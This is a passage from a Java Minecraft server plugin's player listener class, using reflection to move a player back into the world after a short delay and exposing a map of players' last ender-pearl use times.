                    minecraftServer.setAccessible(true);
                    final Object mcserver = minecraftServer.get(con);
                    final Object playerlist = mcserver.getClass().getDeclaredMethod("getPlayerList", (Class<?>[])new Class[0]).invoke(mcserver, new Object[0]);
                    final Method moveToWorld = playerlist.getClass().getMethod("moveToWorld", EntityPlayer2, Integer.TYPE, Boolean.TYPE);
                    moveToWorld.invoke(playerlist, nmsPlayer, 0, false);
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }.runTaskLater((Plugin)this.plugin, 5L);
    }
    
    public static Map<UUID, Long> getLastPearl() {
        return PlayerListener.lastPearl;
    }
}
